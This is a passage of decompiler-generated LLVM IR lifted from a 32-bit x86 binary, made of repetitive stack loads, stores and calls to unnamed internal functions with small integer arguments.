  store i32 ptrtoint ([24 x i8]* @global_var_805436f.8 to i32), i32* %v1_80487c9, align 4
  %v1_80487cf = add i32 %v0_80487c8, 10388
  store i32 %v1_80487cf, i32* %edx.global-to-local, align 4
  %v2_80487d6 = add i32 %v1_80487cf, %v2_80487c3
  store i32 %v2_80487d6, i32* %eax.global-to-local, align 4
  store i32 %v2_80487d6, i32* %v1_80487c8, align 4
  %v3_80487da = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80487da, i32* %eax.global-to-local, align 4
  %v0_80487df = load i32, i32* @esp, align 4
  %v1_80487df = inttoptr i32 %v0_80487df to i32*
  %v2_80487df = load i32, i32* %v1_80487df, align 4
  store i32 %v2_80487df, i32* @ebx, align 4
  %v1_80487e0 = add i32 %v0_80487df, 10388
  store i32 %v1_80487e0, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487e0, i32* %v1_80487df, align 4
  %v2_80487e8 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_80487e8, i32* %eax.global-to-local, align 4
  %v0_80487ed = load i32, i32* @esp, align 4
  %v1_80487ed = inttoptr i32 %v0_80487ed to i32*
  %v3_80487ed = add i32 %v0_80487ed, 4
  %v0_80487ee = load i32, i32* @edi, align 4
  %v1_80487ee = add i32 %v0_80487ee, 20
  store i32 %v1_80487ee, i32* %edx.global-to-local, align 4
  %v1_80487f1 = inttoptr i32 %v3_80487ed to i32*
  %v2_80487f1 = load i32, i32* %v1_80487f1, align 4
  store i32 %v2_80487f1, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487ee, i32* %v1_80487f1, align 4
  %v1_80487f3 = add i32 %v0_80487ed, 10388
  store i32 %v1_80487f3, i32* %edx.global-to-local, align 4
  %v2_80487fa = add i32 %v1_80487f3, %v2_80487e8
  store i32 %v2_80487fa, i32* %eax.global-to-local, align 4
  store i32 %v2_80487fa, i32* %v1_80487ed, align 4
  %v3_80487fe = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80487fe, i32* %eax.global-to-local, align 4
  %v0_8048803 = load i32, i32* @esp, align 4
  %v1_8048803 = inttoptr i32 %v0_8048803 to i32*
  %v2_8048803 = load i32, i32* %v1_8048803, align 4
  store i32 %v2_8048803, i32* @ebx, align 4
  %v1_8048804 = add i32 %v0_8048803, 10388
  store i32 %v1_8048804, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048804, i32* %v1_8048803, align 4
  %v2_804880c = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_804880c, i32* %eax.global-to-local, align 4
  %v0_8048811 = load i32, i32* @esp, align 4
  %v1_8048811 = inttoptr i32 %v0_8048811 to i32*
  %v2_8048811 = load i32, i32* %v1_8048811, align 4
  store i32 %v2_8048811, i32* %edx.global-to-local, align 4
  %v3_8048811 = add i32 %v0_8048811, 4
  %v1_8048812 = inttoptr i32 %v3_8048811 to i32*
  %v2_8048812 = load i32, i32* %v1_8048812, align 4
  store i32 %v2_8048812, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8054387.9 to i32), i32* %v1_8048812, align 4
  %v1_8048818 = add i32 %v0_8048811, 10388
  store i32 %v1_8048818, i32* %edx.global-to-local, align 4
  %v2_804881f = add i32 %v1_8048818, %v2_804880c
  store i32 %v2_804881f, i32* %eax.global-to-local, align 4
  store i32 %v2_804881f, i32* %v1_8048811, align 4
  %v3_8048823 = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048823, i32* %eax.global-to-local, align 4
  %v0_8048828 = load i32, i32* @esp, align 4
  %v1_8048828 = inttoptr i32 %v0_8048828 to i32*
  %v2_8048828 = load i32, i32* %v1_8048828, align 4
  store i32 %v2_8048828, i32* @ebx, align 4
  %v1_8048829 = add i32 %v0_8048828, 10388
  store i32 %v1_8048829, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048829, i32* %v1_8048828, align 4
  %v2_8048831 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8048831, i32* %eax.global-to-local, align 4
  %v0_8048836 = load i32, i32* @esp, align 4
  %v1_8048836 = inttoptr i32 %v0_8048836 to i32*
  %v3_8048836 = add i32 %v0_8048836, 4
  %v0_8048837 = load i32, i32* @edi, align 4
  %v1_8048837 = add i32 %v0_8048837, 789
  store i32 %v1_8048837, i32* %edx.global-to-local, align 4
  %v1_804883d = inttoptr i32 %v3_8048836 to i32*
  %v2_804883d = load i32, i32* %v1_804883d, align 4
  store i32 %v2_804883d, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048837, i32* %v1_804883d, align 4
  %v1_804883f = add i32 %v0_8048836, 10388
  store i32 %v1_804883f, i32* %edx.global-to-local, align 4
  %v2_8048846 = add i32 %v1_804883f, %v2_8048831
  store i32 %v2_8048846, i32* %eax.global-to-local, align 4
  store i32 %v2_8048846, i32* %v1_8048836, align 4
  %v3_804884a = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804884a, i32* %eax.global-to-local, align 4
  %v0_804884f = load i32, i32* @esp, align 4
  %v1_804884f = inttoptr i32 %v0_804884f to i32*
  %v2_804884f = load i32, i32* %v1_804884f, align 4
  store i32 %v2_804884f, i32* %eax.global-to-local, align 4
  %v1_8048850 = add i32 %v0_804884f, 10388
  store i32 %v1_8048850, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048850, i32* %v1_804884f, align 4
  %v2_8048858 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8048858, i32* %eax.global-to-local, align 4
  %v0_804885d = load i32, i32* @esp, align 4
  %v1_804885d = inttoptr i32 %v0_804885d to i32*
  %v2_804885d = load i32, i32* %v1_804885d, align 4
  store i32 %v2_804885d, i32* %ecx.global-to-local, align 4
  %v3_804885d = add i32 %v0_804885d, 4
  %v1_804885e = inttoptr i32 %v3_804885d to i32*
  %v2_804885e = load i32, i32* %v1_804885e, align 4
  store i32 %v2_804885e, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_80543a6.10 to i32), i32* %v1_804885e, align 4
  %v1_8048864 = add i32 %v0_804885d, 10388
  store i32 %v1_8048864, i32* %edx.global-to-local, align 4
  %v2_804886b = add i32 %v1_8048864, %v2_8048858
  store i32 %v2_804886b, i32* %eax.global-to-local, align 4
  store i32 %v2_804886b, i32* %v1_804885d, align 4
  %v3_804886f = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804886f, i32* %eax.global-to-local, align 4
  %v0_8048874 = load i32, i32* @esp, align 4
  %v1_8048874 = inttoptr i32 %v0_8048874 to i32*
  store i32 32, i32* %v1_8048874, align 4
  %v2_804887b = call i32 @function_8050be0(i8 %v1_804887b)
  store i32 %v2_804887b, i32* %eax.global-to-local, align 4
  %v0_8048880 = load i32, i32* @esp, align 4
  %v1_8048880 = inttoptr i32 %v0_8048880 to i32*
  %v2_8048880 = load i32, i32* %v1_8048880, align 4
  store i32 %v2_8048880, i32* %eax.global-to-local, align 4
  %v3_8048880 = add i32 %v0_8048880, 4
  %v1_8048881 = inttoptr i32 %v3_8048880 to i32*
  %v2_8048881 = load i32, i32* %v1_8048881, align 4
  store i32 %v2_8048881, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8048881, align 4
  store i32 32, i32* %v1_8048880, align 4
  %v3_8048886 = call i32 @function_8050b30(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048886, i32* %eax.global-to-local, align 4
  store i32 %v3_8048886, i32* @ebx, align 4
  %v0_804888d = load i32, i32* @esp, align 4
  %v1_804888d = inttoptr i32 %v0_804888d to i32*
  %v2_804888d = load i32, i32* %v1_804888d, align 4
  store i32 %v2_804888d, i32* %eax.global-to-local, align 4
  %v1_804888e = add i32 %v0_804888d, 10388
  store i32 %v1_804888e, i32* %ecx.global-to-local, align 4
  store i32 %v1_804888e, i32* %v1_804888d, align 4
  %v2_8048896 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8048896, i32* %eax.global-to-local, align 4
  %v0_804889b = load i32, i32* @esp, align 4
  %v1_804889b = inttoptr i32 %v0_804889b to i32*
  %v2_804889b = load i32, i32* %v1_804889b, align 4
  store i32 %v2_804889b, i32* %edx.global-to-local, align 4
  %v3_804889b = add i32 %v0_804889b, 4
  %v1_804889c = inttoptr i32 %v3_804889b to i32*
  %v2_804889c = load i32, i32* %v1_804889c, align 4
  store i32 %v2_804889c, i32* %ecx.global-to-local, align 4
  %v0_804889d = load i32, i32* @ebx, align 4
  store i32 %v0_804889d, i32* %v1_804889c, align 4
  %v1_804889e = add i32 %v0_804889b, 10388
  store i32 %v1_804889e, i32* %edx.global-to-local, align 4
  %v2_80488a5 = add i32 %v1_804889e, %v2_8048896
  store i32 %v2_80488a5, i32* %eax.global-to-local, align 4
  store i32 %v2_80488a5, i32* %v1_804889b, align 4
  %v3_80488a9 = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80488a9, i32* %eax.global-to-local, align 4
  %v0_80488ae = load i32, i32* @esp, align 4
  %v1_80488ae = inttoptr i32 %v0_80488ae to i32*
  store i32 32, i32* %v1_80488ae, align 4
  %v2_80488b5 = call i32 @function_8050b60(i8 %v1_804887b)
  store i32 %v2_80488b5, i32* %eax.global-to-local, align 4
  %v0_80488ba = load i32, i32* @esp, align 4
  %v1_80488ba = inttoptr i32 %v0_80488ba to i32*
  %v2_80488ba = load i32, i32* %v1_80488ba, align 4
  store i32 %v2_80488ba, i32* %eax.global-to-local, align 4
  %v1_80488bb = add i32 %v0_80488ba, 10388
  store i32 %v1_80488bb, i32* %ecx.global-to-local, align 4
  store i32 %v1_80488bb, i32* %v1_80488ba, align 4
  %v2_80488c3 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_80488c3, i32* %eax.global-to-local, align 4
  %v0_80488c8 = load i32, i32* @esp, align 4
  %v1_80488c8 = inttoptr i32 %v0_80488c8 to i32*
  %v2_80488c8 = load i32, i32* %v1_80488c8, align 4
  store i32 %v2_80488c8, i32* %ecx.global-to-local, align 4
  %v3_80488c8 = add i32 %v0_80488c8, 4
  %v1_80488c9 = inttoptr i32 %v3_80488c8 to i32*
  %v2_80488c9 = load i32, i32* %v1_80488c9, align 4
  store i32 %v2_80488c9, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_80543a6.10 to i32), i32* %v1_80488c9, align 4
  %v1_80488cf = add i32 %v0_80488c8, 10388
  store i32 %v1_80488cf, i32* %edx.global-to-local, align 4
  %v2_80488d6 = add i32 %v1_80488cf, %v2_80488c3
  store i32 %v2_80488d6, i32* %eax.global-to-local, align 4
  store i32 %v2_80488d6, i32* %v1_80488c8, align 4
  %v3_80488da = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80488da, i32* %eax.global-to-local, align 4
  %v0_80488df = load i32, i32* @esp, align 4
  %v1_80488df = inttoptr i32 %v0_80488df to i32*
  store i32 33, i32* %v1_80488df, align 4
  %v2_80488e6 = call i32 @function_8050be0(i8 %v1_804887b)
  store i32 %v2_80488e6, i32* %eax.global-to-local, align 4
  %v0_80488eb = load i32, i32* @esp, align 4
  %v1_80488eb = inttoptr i32 %v0_80488eb to i32*
  %v2_80488eb = load i32, i32* %v1_80488eb, align 4
  store i32 %v2_80488eb, i32* %eax.global-to-local, align 4
  %v3_80488eb = add i32 %v0_80488eb, 4
  %v1_80488ec = inttoptr i32 %v3_80488eb to i32*
  %v2_80488ec = load i32, i32* %v1_80488ec, align 4
  store i32 %v2_80488ec, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_80488ec, align 4
  store i32 33, i32* %v1_80488eb, align 4
  %v3_80488f1 = call i32 @function_8050b30(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80488f1, i32* %eax.global-to-local, align 4
  store i32 %v3_80488f1, i32* @ebx, align 4
  %v0_80488f8 = load i32, i32* @esp, align 4
  %v1_80488f8 = inttoptr i32 %v0_80488f8 to i32*
  %v2_80488f8 = load i32, i32* %v1_80488f8, align 4
  store i32 %v2_80488f8, i32* %eax.global-to-local, align 4
  %v1_80488f9 = add i32 %v0_80488f8, 10388
  store i32 %v1_80488f9, i32* %ecx.global-to-local, align 4
  store i32 %v1_80488f9, i32* %v1_80488f8, align 4
  %v2_8048901 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8048901, i32* %eax.global-to-local, align 4
  %v0_8048906 = load i32, i32* @esp, align 4
  %v1_8048906 = inttoptr i32 %v0_8048906 to i32*
  %v2_8048906 = load i32, i32* %v1_8048906, align 4
  store i32 %v2_8048906, i32* %edx.global-to-local, align 4
  %v3_8048906 = add i32 %v0_8048906, 4
  %v1_8048907 = inttoptr i32 %v3_8048906 to i32*
  %v2_8048907 = load i32, i32* %v1_8048907, align 4
  store i32 %v2_8048907, i32* %ecx.global-to-local, align 4
  %v0_8048908 = load i32, i32* @ebx, align 4
  store i32 %v0_8048908, i32* %v1_8048907, align 4
  %v1_8048909 = add i32 %v0_8048906, 10388
  store i32 %v1_8048909, i32* %edx.global-to-local, align 4
  %v2_8048910 = add i32 %v1_8048909, %v2_8048901
  store i32 %v2_8048910, i32* %eax.global-to-local, align 4
  store i32 %v2_8048910, i32* %v1_8048906, align 4
  %v3_8048914 = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048914, i32* %eax.global-to-local, align 4
  %v0_8048919 = load i32, i32* @esp, align 4
  %v1_8048919 = inttoptr i32 %v0_8048919 to i32*
  store i32 33, i32* %v1_8048919, align 4
  %v2_8048920 = call i32 @function_8050b60(i8 %v1_804887b)
  store i32 %v2_8048920, i32* %eax.global-to-local, align 4
  %v0_8048925 = load i32, i32* @esp, align 4
  %v1_8048925 = inttoptr i32 %v0_8048925 to i32*
  %v2_8048925 = load i32, i32* %v1_8048925, align 4
  store i32 %v2_8048925, i32* %eax.global-to-local, align 4
  %v1_8048926 = add i32 %v0_8048925, 10388
  store i32 %v1_8048926, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048926, i32* %v1_8048925, align 4
  %v2_804892e = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_804892e, i32* %eax.global-to-local, align 4
  %v0_8048933 = load i32, i32* @esp, align 4
  %v1_8048933 = inttoptr i32 %v0_8048933 to i32*
  %v2_8048933 = load i32, i32* %v1_8048933, align 4
  store i32 %v2_8048933, i32* %ecx.global-to-local, align 4
  %v3_8048933 = add i32 %v0_8048933, 4
  %v1_8048934 = inttoptr i32 %v3_8048933 to i32*
  %v2_8048934 = load i32, i32* %v1_8048934, align 4
  store i32 %v2_8048934, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_80543a6.10 to i32), i32* %v1_8048934, align 4
  %v1_804893a = add i32 %v0_8048933, 10388
  store i32 %v1_804893a, i32* %edx.global-to-local, align 4
  %v2_8048941 = add i32 %v1_804893a, %v2_804892e
  store i32 %v2_8048941, i32* %eax.global-to-local, align 4
  store i32 %v2_8048941, i32* %v1_8048933, align 4
  %v3_8048945 = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048945, i32* %eax.global-to-local, align 4
  %v0_804894a = load i32, i32* @esp, align 4
  %v1_804894a = inttoptr i32 %v0_804894a to i32*
  store i32 34, i32* %v1_804894a, align 4
  %v2_8048951 = call i32 @function_8050be0(i8 %v1_804887b)
  store i32 %v2_8048951, i32* %eax.global-to-local, align 4
  %v0_8048956 = load i32, i32* @esp, align 4
  %v1_8048956 = inttoptr i32 %v0_8048956 to i32*
  %v2_8048956 = load i32, i32* %v1_8048956, align 4
  store i32 %v2_8048956, i32* %eax.global-to-local, align 4
  %v3_8048956 = add i32 %v0_8048956, 4
  %v1_8048957 = inttoptr i32 %v3_8048956 to i32*
  %v2_8048957 = load i32, i32* %v1_8048957, align 4
  store i32 %v2_8048957, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8048957, align 4
  store i32 34, i32* %v1_8048956, align 4
  %v3_804895c = call i32 @function_8050b30(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804895c, i32* %eax.global-to-local, align 4
  store i32 %v3_804895c, i32* @ebx, align 4
  %v0_8048963 = load i32, i32* @esp, align 4
  %v1_8048963 = inttoptr i32 %v0_8048963 to i32*
  %v2_8048963 = load i32, i32* %v1_8048963, align 4
  store i32 %v2_8048963, i32* %eax.global-to-local, align 4
  %v1_8048964 = add i32 %v0_8048963, 10388
  store i32 %v1_8048964, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048964, i32* %v1_8048963, align 4
  %v2_804896c = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_804896c, i32* %eax.global-to-local, align 4
  %v0_8048971 = load i32, i32* @esp, align 4
  %v1_8048971 = inttoptr i32 %v0_8048971 to i32*
  %v2_8048971 = load i32, i32* %v1_8048971, align 4
  store i32 %v2_8048971, i32* %edx.global-to-local, align 4
  %v3_8048971 = add i32 %v0_8048971, 4
  %v1_8048972 = inttoptr i32 %v3_8048971 to i32*
  %v2_8048972 = load i32, i32* %v1_8048972, align 4
  store i32 %v2_8048972, i32* %ecx.global-to-local, align 4
  %v0_8048973 = load i32, i32* @ebx, align 4
  store i32 %v0_8048973, i32* %v1_8048972, align 4
  %v1_8048974 = add i32 %v0_8048971, 10388
  store i32 %v1_8048974, i32* %edx.global-to-local, align 4
  %v2_804897b = add i32 %v1_8048974, %v2_804896c
  store i32 %v2_804897b, i32* %eax.global-to-local, align 4
  store i32 %v2_804897b, i32* %v1_8048971, align 4
  %v3_804897f = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804897f, i32* %eax.global-to-local, align 4
  %v0_8048984 = load i32, i32* @esp, align 4
  %v1_8048984 = inttoptr i32 %v0_8048984 to i32*
  store i32 34, i32* %v1_8048984, align 4
  %v2_804898b = call i32 @function_8050b60(i8 %v1_804887b)
  store i32 %v2_804898b, i32* %eax.global-to-local, align 4
  %v0_8048990 = load i32, i32* @esp, align 4
  %v1_8048990 = inttoptr i32 %v0_8048990 to i32*
  %v1_8048991 = add i32 %v0_8048990, 10388
  store i32 %v1_8048991, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048991, i32* %v1_8048990, align 4
  %v2_8048999 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8048999, i32* %eax.global-to-local, align 4
  %v0_804899e = load i32, i32* @esp, align 4
  %v1_804899e = inttoptr i32 %v0_804899e to i32*
  %v2_804899e = load i32, i32* %v1_804899e, align 4
  store i32 %v2_804899e, i32* @ebx, align 4
  %v3_804899e = add i32 %v0_804899e, 4
  %v1_804899f = inttoptr i32 %v3_804899e to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80543a6.10 to i32), i32* %v1_804899f, align 4
  %v1_80489a5 = add i32 %v0_804899e, 10388
  store i32 %v1_80489a5, i32* %edx.global-to-local, align 4
  %v2_80489ac = add i32 %v1_80489a5, %v2_8048999
  store i32 %v2_80489ac, i32* %eax.global-to-local, align 4
  store i32 %v2_80489ac, i32* %v1_804899e, align 4
  %v3_80489b0 = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80489b0, i32* %eax.global-to-local, align 4
  %v0_80489b5 = load i32, i32* @esp, align 4
  %v1_80489b5 = add i32 %v0_80489b5, 16
  %v1_80489b8 = add i32 %v0_80489b5, 68
  %v2_80489b8 = inttoptr i32 %v1_80489b8 to i32*
  %v3_80489b8 = load i32, i32* %v2_80489b8, align 4
  store i32 %v3_80489b8, i32* %ecx.global-to-local, align 4
  %v1_80489bc = icmp eq i32 %v3_80489b8, 0
  store i1 %v1_80489bc, i1* %zf.global-to-local, align 1
  br i1 %v1_80489bc, label %dec_label_pc_8048ad8, label %dec_label_pc_80489c4

dec_label_pc_80489c4:                             ; preds = %dec_label_pc_8048700
  %v9_80489c4 = icmp eq i32 %v0_80489b5, -4
  store i1 %v9_80489c4, i1* %zf.global-to-local, align 1
  %v2_80489c7 = inttoptr i32 %v0_80489b5 to i32*
  store i32 35, i32* %v2_80489c7, align 4
  %v2_80489c9 = call i32 @function_8050be0(i8 %v1_804887b)
  store i32 %v2_80489c9, i32* %eax.global-to-local, align 4
  %v0_80489ce = load i32, i32* @esp, align 4
  %v1_80489ce = inttoptr i32 %v0_80489ce to i32*
  %v2_80489ce = load i32, i32* %v1_80489ce, align 4
  store i32 %v2_80489ce, i32* %eax.global-to-local, align 4
  %v3_80489ce = add i32 %v0_80489ce, 4
  %v1_80489cf = inttoptr i32 %v3_80489ce to i32*
  %v2_80489cf = load i32, i32* %v1_80489cf, align 4
  store i32 %v2_80489cf, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_80489cf, align 4
  store i32 35, i32* %v1_80489ce, align 4
  %v3_80489d4 = call i32 @function_8050b30(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80489d4, i32* %eax.global-to-local, align 4
  store i32 %v3_80489d4, i32* @ebx, align 4
  %v0_80489db = load i32, i32* @esp, align 4
  %v1_80489db = inttoptr i32 %v0_80489db to i32*
  %v2_80489db = load i32, i32* %v1_80489db, align 4
  store i32 %v2_80489db, i32* %eax.global-to-local, align 4
  %v1_80489dc = add i32 %v0_80489db, 10388
  store i32 %v1_80489dc, i32* %ecx.global-to-local, align 4
  store i32 %v1_80489dc, i32* %v1_80489db, align 4
  %v2_80489e4 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_80489e4, i32* %eax.global-to-local, align 4
  %v0_80489e9 = load i32, i32* @esp, align 4
  %v1_80489e9 = inttoptr i32 %v0_80489e9 to i32*
  %v2_80489e9 = load i32, i32* %v1_80489e9, align 4
  store i32 %v2_80489e9, i32* %edx.global-to-local, align 4
  %v3_80489e9 = add i32 %v0_80489e9, 4
  %v1_80489ea = inttoptr i32 %v3_80489e9 to i32*
  %v2_80489ea = load i32, i32* %v1_80489ea, align 4
  store i32 %v2_80489ea, i32* %ecx.global-to-local, align 4
  %v0_80489eb = load i32, i32* @ebx, align 4
  store i32 %v0_80489eb, i32* %v1_80489ea, align 4
  %v1_80489ec = add i32 %v0_80489e9, 10388
  store i32 %v1_80489ec, i32* %edx.global-to-local, align 4
  %v2_80489f3 = add i32 %v1_80489ec, %v2_80489e4
  store i32 %v2_80489f3, i32* %eax.global-to-local, align 4
  store i32 %v2_80489f3, i32* %v1_80489e9, align 4
  %v3_80489f7 = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80489f7, i32* %eax.global-to-local, align 4
  %v0_80489fc = load i32, i32* @esp, align 4
  %v1_80489fc = inttoptr i32 %v0_80489fc to i32*
  store i32 35, i32* %v1_80489fc, align 4
  %v2_8048a03 = call i32 @function_8050b60(i8 %v1_804887b)
  store i32 %v2_8048a03, i32* %eax.global-to-local, align 4
  %v0_8048a08 = load i32, i32* @esp, align 4
  %v1_8048a08 = inttoptr i32 %v0_8048a08 to i32*
  %v2_8048a08 = load i32, i32* %v1_8048a08, align 4
  store i32 %v2_8048a08, i32* %eax.global-to-local, align 4
  %v1_8048a09 = add i32 %v0_8048a08, 10388
  store i32 %v1_8048a09, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a09, i32* %v1_8048a08, align 4
  %v2_8048a11 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8048a11, i32* %eax.global-to-local, align 4
  %v0_8048a16 = load i32, i32* @esp, align 4
  %v1_8048a16 = inttoptr i32 %v0_8048a16 to i32*
  %v2_8048a16 = load i32, i32* %v1_8048a16, align 4
  store i32 %v2_8048a16, i32* %ecx.global-to-local, align 4
  %v3_8048a16 = add i32 %v0_8048a16, 4
  %v1_8048a17 = inttoptr i32 %v3_8048a16 to i32*
  %v2_8048a17 = load i32, i32* %v1_8048a17, align 4
  store i32 %v2_8048a17, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_80543a6.10 to i32), i32* %v1_8048a17, align 4
  %v1_8048a1d = add i32 %v0_8048a16, 10388
  store i32 %v1_8048a1d, i32* %edx.global-to-local, align 4
  %v2_8048a24 = add i32 %v1_8048a1d, %v2_8048a11
  store i32 %v2_8048a24, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a24, i32* %v1_8048a16, align 4
  %v3_8048a28 = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048a28, i32* %eax.global-to-local, align 4
  %v0_8048a2d = load i32, i32* @esp, align 4
  %v1_8048a2d = inttoptr i32 %v0_8048a2d to i32*
  %v2_8048a2d = load i32, i32* %v1_8048a2d, align 4
  store i32 %v2_8048a2d, i32* %eax.global-to-local, align 4
  %v3_8048a2d = add i32 %v0_8048a2d, 4
  %v1_8048a2e = inttoptr i32 %v3_8048a2d to i32*
  %v2_8048a2e = load i32, i32* %v1_8048a2e, align 4
  store i32 %v2_8048a2e, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8048a2e, align 4
  store i32 40, i32* %v1_8048a2d, align 4
  %v3_8048a33 = call i32 @function_8050b30(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048a33, i32* %eax.global-to-local, align 4
  store i32 %v3_8048a33, i32* @ebx, align 4
  %v0_8048a3a = load i32, i32* @esp, align 4
  %v1_8048a3a = inttoptr i32 %v0_8048a3a to i32*
  %v2_8048a3a = load i32, i32* %v1_8048a3a, align 4
  store i32 %v2_8048a3a, i32* %eax.global-to-local, align 4
  %v1_8048a3b = add i32 %v0_8048a3a, 10388
  store i32 %v1_8048a3b, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a3b, i32* %v1_8048a3a, align 4
  %v2_8048a43 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8048a43, i32* %eax.global-to-local, align 4
  %v0_8048a48 = load i32, i32* @esp, align 4
  %v1_8048a48 = inttoptr i32 %v0_8048a48 to i32*
  %v2_8048a48 = load i32, i32* %v1_8048a48, align 4
  store i32 %v2_8048a48, i32* %edx.global-to-local, align 4
  %v3_8048a48 = add i32 %v0_8048a48, 4
  %v1_8048a49 = inttoptr i32 %v3_8048a48 to i32*
  %v2_8048a49 = load i32, i32* %v1_8048a49, align 4
  store i32 %v2_8048a49, i32* %ecx.global-to-local, align 4
  %v0_8048a4a = load i32, i32* @ebx, align 4
  store i32 %v0_8048a4a, i32* %v1_8048a49, align 4
  %v1_8048a4b = add i32 %v0_8048a48, 10388
  store i32 %v1_8048a4b, i32* %edx.global-to-local, align 4
  %v2_8048a52 = add i32 %v1_8048a4b, %v2_8048a43
  store i32 %v2_8048a52, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a52, i32* %v1_8048a48, align 4
  %v3_8048a56 = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048a56, i32* %eax.global-to-local, align 4
  %v0_8048a5b = load i32, i32* @esp, align 4
  %v1_8048a5b = inttoptr i32 %v0_8048a5b to i32*
  %v2_8048a5b = load i32, i32* %v1_8048a5b, align 4
  store i32 %v2_8048a5b, i32* @ebx, align 4
  %v1_8048a5c = add i32 %v0_8048a5b, 10388
  store i32 %v1_8048a5c, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a5c, i32* %v1_8048a5b, align 4
  %v2_8048a64 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8048a64, i32* %eax.global-to-local, align 4
  %v0_8048a69 = load i32, i32* @esp, align 4
  %v1_8048a69 = inttoptr i32 %v0_8048a69 to i32*
  %v2_8048a69 = load i32, i32* %v1_8048a69, align 4
  store i32 %v2_8048a69, i32* %edx.global-to-local, align 4
  %v3_8048a69 = add i32 %v0_8048a69, 4
  %v1_8048a6a = inttoptr i32 %v3_8048a69 to i32*
  %v2_8048a6a = load i32, i32* %v1_8048a6a, align 4
  store i32 %v2_8048a6a, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805439f.7 to i32), i32* %v1_8048a6a, align 4
  %v1_8048a70 = add i32 %v0_8048a69, 10388
  store i32 %v1_8048a70, i32* %edx.global-to-local, align 4
  %v2_8048a77 = add i32 %v1_8048a70, %v2_8048a64
  store i32 %v2_8048a77, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a77, i32* %v1_8048a69, align 4
  %v3_8048a7b = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048a7b, i32* %eax.global-to-local, align 4
  %v0_8048a80 = load i32, i32* @esp, align 4
  %v1_8048a80 = inttoptr i32 %v0_8048a80 to i32*
  %v2_8048a80 = load i32, i32* %v1_8048a80, align 4
  store i32 %v2_8048a80, i32* %eax.global-to-local, align 4
  %v1_8048a81 = add i32 %v0_8048a80, 10388
  store i32 %v1_8048a81, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a81, i32* %v1_8048a80, align 4
  %v2_8048a89 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8048a89, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a89, i32* @ebx, align 4
  %v0_8048a90 = load i32, i32* @esp, align 4
  %v1_8048a90 = inttoptr i32 %v0_8048a90 to i32*
  %v2_8048a90 = load i32, i32* %v1_8048a90, align 4
  store i32 %v2_8048a90, i32* %eax.global-to-local, align 4
